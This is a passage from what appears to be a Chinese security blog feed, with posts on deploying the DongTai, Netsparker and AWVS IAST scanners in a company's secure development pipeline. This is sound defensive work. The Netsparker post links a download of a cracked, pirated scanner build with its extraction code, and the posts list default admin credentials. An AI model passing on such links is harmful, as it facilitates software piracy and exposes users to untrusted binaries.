dongtai-openapi || true</span><br><span class="line">docker rm dongtai-openapi || true</span><br><span class="line">docker run -d --network dongtai-net -p 8000:8000 --name dongtai-openapi --restart=always huoxian/dongtai-openapi:latest</span><br></pre></td></tr></table></figure><h5 id="7-启动dongtai-engine服务"><a href="#7-启动dongtai-engine服务" class="headerlink" title="7.  启动dongtai-engine服务"></a>7.  启动dongtai-engine服务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd DongTai-engine/</span><br><span class="line">git pull </span><br><span class="line"></span><br><span class="line">cp DongTai-webapi/conf/config.ini conf/config.ini</span><br><span class="line">docker build -t huoxian/dongtai-engine:latest .</span><br><span class="line">docker stop dongtai-engine || true</span><br><span class="line">docker rm dongtai-engine || true</span><br><span class="line">docker run -d --network dongtai-net --name dongtai-engine --restart=always huoxian/dongtai-engine:latest</span><br></pre></td></tr></table></figure><h5 id="8-启动dongtai-engine-task服务"><a href="#8-启动dongtai-engine-task服务" class="headerlink" title="8.  启动dongtai-engine-task服务"></a>8.  启动dongtai-engine-task服务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd DongTai-engine/</span><br><span class="line">docker run -d --network dongtai-net --name dongtai-engine-task --restart=always huoxian/dongtai-engine:latest bash /opt/iast/engine/docker/entrypoint.sh task</span><br></pre></td></tr></table></figure><h5 id="9-启动dongtai-web服务"><a href="#9-启动dongtai-web服务" class="headerlink" title="9.  启动dongtai-web服务"></a>9.  启动dongtai-web服务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cd DongTai-web</span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line">cp nginx.conf.example nginx.conf</span><br><span class="line"></span><br><span class="line">sed -i &quot;s/lingzhi-api-svc/dongtai-webapi/g&quot; nginx.conf &gt;/dev/null</span><br><span class="line"><span class="meta">#</span><span class="bash"> 因为npm一直build失败，直接使用项目中的dist</span></span><br><span class="line"></span><br><span class="line">docker build -t huoxian/dongtai-web:latest .</span><br><span class="line">docker stop dongtai-web || true</span><br><span class="line">docker rm dongtai-web || true</span><br><span class="line">docker run -d -p 80:80 --network dongtai-net --name dongtai-web --restart=always huoxian/dongtai-web:latest</span><br></pre></td></tr></table></figure><h4 id="4-登陆管理后台"><a href="#4-登陆管理后台" class="headerlink" title="4. 登陆管理后台"></a>4. 登陆管理后台</h4><blockquote><p>确保安全组或防火墙开启80、8000端口</p></blockquote><p>浏览器访问：<a href="http://x.x.x.x/">http://x.x.x.x</a> 访问<code>dongtai-web</code>服务（默认用户名/密码：admin、admin），登陆后及时<strong>修改密码</strong>，在系统配置 - 密码修改处修改密码，然后做好安全组策略，防止恶意扫描<br><img src="https://huoxian-zone.oss-cn-beijing.aliyuncs.com/images750aeb74906981d13308edad215eb618.png" alt="image.png"></p><p>组织管理中，可以新增子部门及普通用户，方便后续分工；子部门用于区分应用所属业务线，每个业务线分别生成属于自己的agent</p><h3 id="二、IAST-agent部署与测试"><a href="#二、IAST-agent部署与测试" class="headerlink" title="二、IAST agent部署与测试"></a>二、IAST agent部署与测试</h3><p>管理后台部署完成后，接下来就需要带着分管安全的leader去找每条业务线研发leader、测试、应用运维，去了解一下现有的网络架构，笔者公司的测试服务均跑在K8S上，Java版本为1.8。</p><h4 id="1-生成agent"><a href="#1-生成agent" class="headerlink" title="1. 生成agent"></a>1. 生成agent</h4><p>进入管理后台，右上角部署IAST</p><p><img src="https://pic.rmb.bdstatic.com/bjh/7497617ea2df99ab88d01bcb3036674f.png" alt="image.png"></p><p>选择应用运行环境，目前我们Java的服务都通过maven打包成jar包，通过<code>java -jar</code> 命令的方式启动，项目名称可以保持默认，我们所有的服务均在<code>CD阶段</code>通过传参的方式指定</p><p><img src="https://pic.rmb.bdstatic.com/bjh/4e795642476d564695002da44ddd603e.png" alt="image.png"></p><p>最后获取下载脚本，这里去掉<strong>projectNmae</strong>参数，下载agent</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET &quot;http://x.x.x.x:8000/api/v1/agent/download?url=http://x.x.x.x:8000&amp;jdk.version=Java%201.8&quot; -H &#x27;Authorization: Token xxx&#x27; -o agent.jar -k</span><br></pre></td></tr></table></figure><h4 id="2-本地测试"><a href="#2-本地测试" class="headerlink" title="2. 本地测试"></a>2. 本地测试</h4><p>2.1 启动命令添加配置，启动洞态IAST</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:./agent.jar -Dproject.name=test -Diast.server.mode=local -jar app.jar</span><br></pre></td></tr></table></figure><p>2.2 出现<code>Engine opened successfully</code>日志时，表示洞态IAST启动成功</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[cn.huoxian.dongtai.iast] The engine configuration file is initialized successfully. file is \config\iast.properties</span><br><span class="line">[cn.huoxian.dongtai.iast] Check <span class="keyword">if</span> the engine needs to be updated</span><br><span class="line">&#123;<span class="string">&quot;status&quot;</span>: <span class="number">202</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;不需要更新或正在更新中&quot;</span>, <span class="string">&quot;data&quot;</span>: <span class="keyword">null</span>&#125;</span><br><span class="line">[cn.huoxian.dongtai.iast] Engine does not exist in local cache, the engine will be downloaded.</span><br><span class="line">current jdk version is : <span class="number">1.8</span><span class="number">.0_251</span></span><br><span class="line">[cn.huoxian.dongtai.iast] The remote file http:<span class="comment">//x.x.x.x:8000/api/v1/engine/download?package_name=iast-inject&amp;jdk.version=1 was successfully written to the local cache.</span></span><br><span class="line">[cn.huoxian.dongtai.iast] The remote file http:<span class="comment">//x.x.x.x:8000/api/v1/engine/download?package_name=iast-core&amp;jdk.version=1 was successfully written to the local cache.</span></span><br><span class="line"><span class="number">2021</span>-<span class="number">05</span>-<span class="number">12</span> <span class="number">14</span>:<span class="number">13</span>:<span class="number">33.089</span> [cn.huoxian.dongtai.engine] INFO  The engine is about to be installed, the installation mode is agent</span><br><span class="line"><span class="number">2021</span>-<span class="number">05</span>-<span class="number">12</span> <span class="number">14</span>:<span class="number">13</span>:<span class="number">33.147</span> [cn.huoxian.dongtai.engine] INFO  Initialize the core configuration of the engine</span><br><span class="line"><span class="number">2021</span>-<span class="number">05</span>-<span class="number">12</span> <span class="number">14</span>:<span class="number">13</span>:<span class="number">33.603</span> [cn.huoxian.dongtai.engine] INFO  The engine<span class="string">&#x27;s core configuration is initialized successfully.</span></span><br><span class="line"><span class="string">2021-05-12 14:13:33.606 [cn.huoxian.dongtai.engine] INFO  WebServer [ name=Tomcat/8.x, path=\apache-tomcat-8.5.12\bin ]</span></span><br><span class="line"><span class="string">2021-05-12 14:13:33.607 [cn.huoxian.dongtai.engine] INFO  Start the data reporting submodule</span></span><br><span class="line"><span class="string">2021-05-12 14:13:33.608 [cn.huoxian.dongtai.engine] INFO  The data reporting submodule started successfully</span></span><br><span class="line"><span class="string">2021-05-12 14:13:33.608 [cn.huoxian.dongtai.engine] INFO  Register spy submodule</span></span><br><span class="line"><span class="string">2021-05-12 14:13:33.615 [cn.huoxian.dongtai.engine] INFO  Spy sub-module registered successfully</span></span><br><span class="line"><span class="string">2021-05-12 14:13:33.616 [cn.huoxian.dongtai.engine] INFO  Install data acquisition and analysis sub-modules</span></span><br><span class="line"><span class="string">2021-05-12 14:13:35.856 [cn.huoxian.dongtai.engine] INFO  The sub-module of data acquisition and analysis is successfully installed</span></span><br><span class="line"><span class="string">2021-05-12 14:13:35.861 [cn.huoxian.dongtai.engine] INFO  The engine is successfully installed to the JVM, and it takes 2773ms</span></span><br><span class="line"><span class="string">2021-05-12 14:13:46.476 [cn.huoxian.dongtai.engine] INFO  Turn on the engine</span></span><br><span class="line"><span class="string">2021-05-12 14:13:46.480 [cn.huoxian.dongtai.engine] INFO  Engine opened successfully</span></span><br><span class="line"><span class="string">[cn.huoxian.dongtai.iast] Successfully opened the engine, and it takes  22s</span></span><br><span class="line"><span class="string">&#123;&quot;status&quot;: 202, &quot;msg&quot;: &quot;不需要更新或正在更新中&quot;, &quot;data&quot;: null&#125;</span></span><br></pre></td></tr></table></figure><p>2.3 打开管理后台，选择项目配置 - 新建项目，配置项目名称为test，添加扫描策略</p><p><img src="https://pic.rmb.bdstatic.com/bjh/2675c6f1c5572eca861a94162b0530c1.png" alt="image.png"></p><p><strong>Note:</strong> 启动服务时，配置了参数<code>-Dproject.name=test</code>，所以，``agent<code>会自动关联至</code>test`项目中，不需要人工配置</p><h4 id="3-与CI-CD集成"><a href="#3-与CI-CD集成" class="headerlink" title="3. 与CI/CD集成"></a>3. 与CI/CD集成</h4><p>目前IAST项目是以业务线进行分组，在管理后台 - 项目配置 - 新建项目，添加项目，项目名称对应各个业务线简称，在启动服务时，通过配置<code>-Dproject.name=$业务线</code> 将agent自动关联至项目中</p><h5 id="3-1-配置jenkins"><a href="#3-1-配置jenkins" class="headerlink" title="3.1 配置jenkins"></a>3.1 配置jenkins</h5><p>将agent打包到公共基础镜像，按照jenkins原来的基础镜像进行选择即可</p><p>基础镜像 java:1.8-sec-agent</p><p><code>Dockerfile = &quot;FROM reg.xx.com/base/java:1.8-sec-agent”</code></p><h5 id="3-2-配置启动命令"><a href="#3-2-配置启动命令" class="headerlink" title="3.2 配置启动命令"></a>3.2 配置启动命令</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /data/build/k8s/<span class="built_in">test</span>/$业务线/</span><br><span class="line">vim <span class="variable">$appid</span>.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加以下这段commad参数:  &quot;-javaagent:/agent.jar&quot;,&quot;-Dproject.name=$业务线&quot;,&quot;-Diast.server.mode=local&quot;</span></span><br></pre></td></tr></table></figure><h5 id="3-3-重新构建jenkins"><a href="#3-3-重新构建jenkins" class="headerlink" title="3.3 重新构建jenkins"></a>3.3 重新构建jenkins</h5><h5 id="3-4-测试服务功能是否正常"><a href="#3-4-测试服务功能是否正常" class="headerlink" title="3.4 测试服务功能是否正常"></a>3.4 测试服务功能是否正常</h5><p>经测试，服务运行均正常</p><h4 id="5-针对增量服务"><a href="#5-针对增量服务" class="headerlink" title="5. 针对增量服务"></a>5. 针对增量服务</h4><p>笔者与运维开发沟通后，修改自动化发布流程及脚本，对测试环境中新增的Java服务，将自动集成洞态IAST，确保agent覆盖率，目前已基本实现测试服务的覆盖。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;IAST作为开展sdl中黑白盒测试的有效补充，还是很有必要去了解使用的。笔者为了完善公司的SDL流程，调研了开源的IAST产品进行测试和内部推广&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="SDL" scheme="http://www.pa55w0rd.online/tags/SDL/"/>
    
    <category term="DevSecOps" scheme="http://www.pa55w0rd.online/tags/DevSecOps/"/>
    
  </entry>
  
  <entry>
    <title>Netsparker扫描器IAST使用</title>
    <link href="http://www.pa55w0rd.online/netsparker-iast/"/>
    <id>http://www.pa55w0rd.online/netsparker-iast/</id>
    <published>2021-05-14T02:12:37.000Z</published>
    <updated>2021-05-14T02:53:14.121Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前测试了AWVS扫描器的IAST功能，使用上不是很方便，需要对每个服务启动一个扫描任务才可以进行扫描，比较主动，无法作为独立的被动式扫描器使用，脏数据也是比较多</p><p>对比awvs和netsparker，在前后端分离场景下，awvs扫描器可以分析swagger文件进行全接口自动化安全扫描，开发人员可以使用该功能增加后端系统的安全测试效率。在多人协作的测试场景下，netsparker扫描器可以开启代理端口，充分导入有效流量进行自动化安全测试，发现隐蔽的安全漏洞</p><span id="more"></span><h2 id="0x01-扫描器安装"><a href="#0x01-扫描器安装" class="headerlink" title="0x01 扫描器安装"></a>0x01 扫描器安装</h2><p>破解版下载<a href="https://pan.baidu.com/s/18lY8xIXoQDcfLRqKFah9kQ">https://pan.baidu.com/s/18lY8xIXoQDcfLRqKFah9kQ</a> 提取码：6cvp</p><p>Netsparker Professional Edition v6.0.0.29750 [ Licensed ] </p><p>Windows双击安装，打开</p><p><img src="https://pic.rmb.bdstatic.com/bjh/74f608277827a8eeb974596449b132d1.png" alt="image.png"></p><h2 id="0x02-IAST使用"><a href="#0x02-IAST使用" class="headerlink" title="0x02 IAST使用"></a>0x02 IAST使用</h2><p><code>Netsparker Shark</code>使您可以在Web应用程序中进行<code>交互式安全测试（IAST）</code>，以确认更多漏洞并进一步减少误报。为了使<code>Netsparker Shark</code>能够运行，您需要下载一个代理并将其部署在您的服务器上。请注意，出于安全原因，该代理是为每个目标网站唯一生成的。</p><p>参考官方文档进行安装 <a href="https://www.netsparker.com/support/deploying-netsparker-shark-for-java-windows/">https://www.netsparker.com/support/deploying-netsparker-shark-for-java-windows/</a></p><h3 id="2-1-生成iast-agent"><a href="#2-1-生成iast-agent" class="headerlink" title="2.1 生成iast agent"></a>2.1 生成iast agent</h3><p>添加扫描目标 - <a href="http://192.168.244.129:8080/">http://192.168.244.129:8080/</a></p><p>选择扫描设置 - Shark - 勾上enable shark，选择服务平台 java，保存为shark.jar </p><p><img src="https://pic.rmb.bdstatic.com/bjh/25109d6ed07f2432ed53ad7dad632ad0.png" alt="image.png"></p><h3 id="2-2-使用iast"><a href="#2-2-使用iast" class="headerlink" title="2.2 使用iast"></a>2.2 使用iast</h3><p>这里使用和awvs类似</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>. Deploying AspectJWeaver into your web application</span><br><span class="line"></span><br><span class="line"><span class="attribute">Download</span> AspectJWeaver: https://repo<span class="number">1</span>.maven.org/maven<span class="number">2</span>/org/aspectj/aspectjweaver/<span class="number">1</span>.<span class="number">9</span>.<span class="number">5</span>/aspectjweaver-<span class="number">1</span>.<span class="number">9</span>.<span class="number">5</span>.jar</span><br><span class="line"><span class="attribute">From</span> the download folder, select aspectjweaver-<span class="number">1</span>.<span class="number">9</span>.<span class="number">5</span>.jar and rename it aspectjweaver.jar</span><br><span class="line"><span class="attribute">Copy</span> aspectjweaver and paste it intoC:\Program Files (x<span class="number">86</span>)\Apache Software Foundation\Tomcat <span class="number">9</span>.<span class="number">0</span>/lib</span><br><span class="line"><span class="attribute">2</span>. Deploying Shark into your web server</span><br><span class="line"></span><br><span class="line"><span class="attribute">Download</span> the Netsparker Shark JAVA from Netsparker</span><br><span class="line"><span class="attribute">Copy</span> the Netsparker Shark JAVA (Shark.jar) to %TOMCAT-HOME%\lib</span><br><span class="line"><span class="attribute">If</span> installing <span class="literal">on</span> Windows where Tomcat <span class="number">9</span> was installed using the official <span class="string">&quot;32-bit/64-bit Windows Service Installer&quot;</span>, copy the Shark.jar file to C:\Program Files (x<span class="number">86</span>)\Apache Software Foundation\Tomcat <span class="number">9</span>.<span class="number">0</span>\lib  </span><br></pre></td></tr></table></figure><p><img src="https://pic.rmb.bdstatic.com/bjh/84ae6b186f82be98819cae4525abb30f.png" alt="image.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3.</span> Configuring Tomcat <span class="keyword">to</span> use AspectJWeaver <span class="keyword">and</span> Shark</span><br><span class="line"></span><br><span class="line">Launch Tomcat <span class="keyword">with</span> <span class="keyword">Load</span> <span class="type">Time</span> Weaving enabled. This can be done <span class="keyword">by</span> adding a -javaagent parameter <span class="keyword">with</span> the <span class="type">path</span> <span class="keyword">to</span> aspectjweaver.jar <span class="keyword">when</span> launching Tomcat, <span class="keyword">and</span> optionally a parameter <span class="keyword">to</span> <span class="keyword">enable</span> the Shark <span class="keyword">debug</span> logging.</span><br><span class="line"><span class="keyword">Add</span> two parameters <span class="keyword">into</span> the Apache Tomcat <span class="keyword">Configuration</span> &gt; Java <span class="keyword">options</span> tab</span><br><span class="line">-javaagent: C:\Program Files (x86)\Apache Software Foundation\Tomcat <span class="number">9.0</span>\lib\aspectjweaver.jar (mandatory; adjust <span class="type">path</span> depending <span class="keyword">on</span> <span class="keyword">where</span> you deployed the aspectjweaver.jar file)</span><br><span class="line">-Dacusensor.<span class="keyword">debug</span>.<span class="keyword">log</span>=<span class="keyword">ON</span> (optional; enables <span class="keyword">debug</span> logging)</span><br></pre></td></tr></table></figure><p><img src="https://pic.rmb.bdstatic.com/bjh/4cc0ba3610fe44ea609e6ab91587b553.png" alt="image.png"></p><p>这里也在配置awvs时配置过了，跳过</p><p><code>Restart the Tomcat service</code></p><blockquote><p>The parameter “-Dacusensor.debug.log=ON” is optional and can be omitted. If this parameter is retained, this will output the Shark logging as additional lines in the Tomcat logs starting with “[Netsparker-debug]”.</p></blockquote><h3 id="2-3-删除agent"><a href="#2-3-删除agent" class="headerlink" title="2.3 删除agent"></a>2.3 删除agent</h3><p>Disabling and Removing Netsparker Shark for Java</p><p>To remove and disable the sensor from your website, you need to revert the changes done during the deployment of the Agent.</p><ul><li>Remove the Netsparker Shark (Shark.jar) from the folder where it was deployed</li><li>Remove aspectjweaver.jar from the folder where it was copied to</li><li>Reconfigure Tomcat with Load Time Weaving disabled, as follows:<ul><li>Remove the -javaagent and -Dacusensor.debug.log parameters in the Apache Tomcat Configuration &gt; Java options tab</li><li>Restart the Tomcat service<blockquote><p>Although the Netsparker Shark agent is secured with a strong password, it is recommended that the Shark client files are uninstalled and removed from the web application if they are no longer in use.</p></blockquote></li></ul></li></ul><h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p><img src="https://pic.rmb.bdstatic.com/bjh/44e7754f0eabea70e0c678072e938ffd.png" alt="image.png"></p><p>配置完成之后如果直接点击<code>start scan</code> ，会类似AWVS的iast一样，先通过dast，然后再通过iast增加漏洞的准确性，这里依然会产生大量请求和脏数据</p><p>这里有一个<strong>代理模式</strong>，选择</p><p><img src="https://pic.rmb.bdstatic.com/bjh/1937f78c4aa267dad7870488a4d36bd4.png" alt="image.png"></p><p>首次打开会弹出安装证书</p><p><img src="https://pic.rmb.bdstatic.com/bjh/3459f2f6f0887b1855c25afa67902fa4.png" alt="image.png"></p><p><img src="https://pic.rmb.bdstatic.com/bjh/7bae47bbd0df8d377f951e489474558a.png" alt="image.png"></p><p>打开浏览器，设置代理， 10010端口，访问待测系统</p><p><img src="https://pic.rmb.bdstatic.com/bjh/8c08345d2e4980a127f42e21d8555a4a.png" alt="image.png"></p><p>流量抓取完成，开始扫描</p><p><img src="https://pic.rmb.bdstatic.com/bjh/4f398d507beedd723aa6d4c89e28768a.png" alt="image.png"></p><p><img src="https://pic.rmb.bdstatic.com/bjh/c67fbf0b426720f54a29481ee4c44f40.png" alt="image.png"></p><p>这里单独使用iast的sql注入规则，产生8条脏数据</p><p><img src="https://pic.rmb.bdstatic.com/bjh/c7bc57ee86deea9a5f9df71fcee80ccb.png" alt="image.png"></p><p>IAST相关规则</p><p><img src="https://pic.rmb.bdstatic.com/bjh/bb00fa48b60cf38beab883d434832811.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;之前测试了AWVS扫描器的IAST功能，使用上不是很方便，需要对每个服务启动一个扫描任务才可以进行扫描，比较主动，无法作为独立的被动式扫描器使用，脏数据也是比较多&lt;/p&gt;
&lt;p&gt;对比awvs和netsparker，在前后端分离场景下，awvs扫描器可以分析swagger文件进行全接口自动化安全扫描，开发人员可以使用该功能增加后端系统的安全测试效率。在多人协作的测试场景下，netsparker扫描器可以开启代理端口，充分导入有效流量进行自动化安全测试，发现隐蔽的安全漏洞&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="SDL" scheme="http://www.pa55w0rd.online/tags/SDL/"/>
    
  </entry>
  
  <entry>
    <title>AWVS扫描器IAST使用</title>
    <link href="http://www.pa55w0rd.online/awvs-iast/"/>
    <id>http://www.pa55w0rd.online/awvs-iast/</id>
    <published>2021-05-14T02:12:17.000Z</published>
    <updated>2021-05-14T02:53:15.471Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>很久没有更新blog了，这次把几个笔记分享一下，AWVS自带的IAST功能，很多人都不知道，这里记录一下IAST如何使用</p><span id="more"></span><h2 id="0x01-扫描器部署"><a href="#0x01-扫描器部署" class="headerlink" title="0x01 扫描器部署"></a>0x01 扫描器部署</h2><p>这里笔记写的较早，版本还是awvs13</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> pull 拉取下载镜像</span></span><br><span class="line">docker pull secfa/docker-awvs</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将Docker的3443端口映射到物理机的 13443端口</span></span><br><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 容器的相关信息</span></span><br><span class="line">awvs13 username: admin@admin.com</span><br><span class="line">awvs13 password: Admin123</span><br><span class="line">AWVS版本：13.0.201006145</span><br></pre></td></tr></table></figure><p>浏览器访问</p><p><a href="https://192.168.244.130:13443/#/login">https://192.168.244.130:13443/#/login</a></p><p><img src="https://pic.rmb.bdstatic.com/bjh/8c9714c2e8c1c31f9285e8490a784641.png" alt="image.png"></p><h2 id="0x02-开启IAST插装模式"><a href="#0x02-开启IAST插装模式" class="headerlink" title="0x02 开启IAST插装模式"></a>0x02 开启IAST插装模式</h2><h3 id="2-1-新建目标"><a href="#2-1-新建目标" class="headerlink" title="2.1 新建目标"></a>2.1 新建目标</h3><p><img src="https://pic.rmb.bdstatic.com/bjh/42a953e902464cb9c846984760d44fad.png" alt="image.png"></p><h3 id="2-2-开启AcuSensor"><a href="#2-2-开启AcuSensor" class="headerlink" title="2.2 开启AcuSensor"></a>2.2 开启AcuSensor</h3><p>AcuSensor 允许扫描程序从您的 PHP、.NET 或 Java web 应用程序收集更多信息，用于改善扫描结果，并减少误报。请于运行 Web 扫描前，下载并安装与目标对应的 AcuSensor。</p><p>注意：避免在生产系统中使用 AcuSensor。</p><p>使用介绍：<code>https://www.acunetix.com/support/docs/installing-acusensor/</code></p><p>针对JAVA程序使用：<code>https://www.acunetix.com/support/docs/installing-acusensor-java/</code></p><p>传感器是针对每个网站唯一生成的</p><p>Acunetix JAVA Acusensor需要Tomcat（7+）和Java（1.7+）</p><p><img src="https://pic.rmb.bdstatic.com/bjh/de790e1ae062fe4ffafd994a6795f5c7.png" alt="image.png"></p><h3 id="2-3-安装切面和传感器"><a href="#2-3-安装切面和传感器" class="headerlink" title="2.3 安装切面和传感器"></a>2.3 安装切面和传感器</h3><p>Java AcuSensor要求：</p><p>将<code>Aspectjweaver.jar</code>部署到您的Web服务器中-提供<code>AcuSensor</code>与您的应用程序一起使用所需的集成<br>将<code>Acunetix Java AcuSensor</code>部署到Web服务器中-这对于每个Target都是唯一的，可以使用“<code>下载JAVA AcuSensor</code>”按钮进行下载<br>配置您的Web服务器以使用加载时间编织（<code>AspectJWeaver</code>）</p><p><a href="https://www.acunetix.com/support/docs/wvs/deploying-acusensor-java-centos-rhel/">https://www.acunetix.com/support/docs/wvs/deploying-acusensor-java-centos-rhel/</a></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.3</span><span class="number">.1</span> Deploying AspectJWeaver <span class="keyword">into</span> your web application</span><br><span class="line"></span><br><span class="line">To download <span class="keyword">and</span> deploy AspectJWeaver, run <span class="keyword">the</span> following commands:</span><br><span class="line"></span><br><span class="line">wget -c <span class="keyword">https</span>://repo1.maven.org/maven2/org/aspectj/aspectjweaver/<span class="number">1.9</span><span class="number">.5</span>/aspectjweaver<span class="number">-1.9</span><span class="number">.5</span>.jar</span><br><span class="line">sudo mv aspectjweaver<span class="number">-1.9</span><span class="number">.5</span>.jar /opt/tomcat9/lib</span><br><span class="line">sudo <span class="built_in">ln</span> -s /opt/tomcat9/lib/aspectjweaver<span class="number">-1.9</span><span class="number">.5</span>.jar /opt/tomcat9/lib/aspectjweaver.jar</span><br><span class="line"><span class="number">2.3</span><span class="number">.2</span>  Deploying AcuSensor <span class="keyword">into</span> your web application</span><br><span class="line"></span><br><span class="line">Download <span class="keyword">the</span> Acunetix JAVA AcuSensor <span class="built_in">from</span> <span class="keyword">the</span> Acunetix UI</span><br><span class="line">Copy <span class="keyword">the</span> Acunetix JAVA AcuSensor (AcuSensor.jar) <span class="built_in">to</span> %TOMCAT-HOME%\lib - based <span class="keyword">on</span> <span class="title">the</span> <span class="title">assumptions</span> <span class="title">above</span>, <span class="title">you</span> <span class="title">would</span> <span class="title">copy</span> <span class="title">the</span> <span class="title">AcuSensor</span>.<span class="title">jar</span> <span class="title">file</span> <span class="title">to</span> /<span class="title">opt</span>/<span class="title">tomcat9</span>/<span class="title">lib</span></span><br><span class="line"><span class="number">2.3</span><span class="number">.3</span> Configure Tomcat <span class="built_in">to</span> use AspectJWeaver <span class="keyword">and</span> AcuSensor</span><br><span class="line"></span><br><span class="line">Launch Tomcat <span class="keyword">with</span> Load Time Weaving enabled. This can be done <span class="keyword">by</span> adding <span class="keyword">a</span> -javaagent parameter <span class="keyword">with</span> <span class="keyword">the</span> path <span class="built_in">to</span> aspectjweaver.jar when launching Tomcat, <span class="keyword">and</span> optionally <span class="keyword">a</span> parameter <span class="built_in">to</span> enable AcuSensor debug logging</span><br><span class="line">For Centos <span class="number">8.1</span> <span class="keyword">and</span> RHEL <span class="number">8.1</span>, you will need <span class="built_in">to</span> <span class="built_in">add</span> <span class="number">2</span> parameters <span class="keyword">into</span> <span class="keyword">the</span> Tomcat setenv.sh script (normally you will be creating <span class="keyword">a</span> <span class="built_in">new</span> <span class="built_in">file</span>):</span><br><span class="line">run <span class="keyword">the</span> <span class="keyword">command</span>: <span class="title">sudo</span> <span class="title">nano</span> /<span class="title">opt</span>/<span class="title">tomcat9</span>/<span class="title">bin</span>/<span class="title">setenv</span>.<span class="title">sh</span></span><br><span class="line"><span class="keyword">at</span> <span class="keyword">the</span> <span class="function"><span class="keyword">end</span> <span class="title">of</span> <span class="title">the</span> <span class="title">file</span>, <span class="title">add</span> <span class="title">the</span> <span class="title">line</span>: <span class="title">JAVA_OPTS</span>=&quot;$<span class="title">JAVA_OPTS</span> -<span class="title">javaagent</span>:$<span class="title">CATALINA_HOME</span>/<span class="title">lib</span>/<span class="title">aspectjweaver</span>.<span class="title">jar</span> -<span 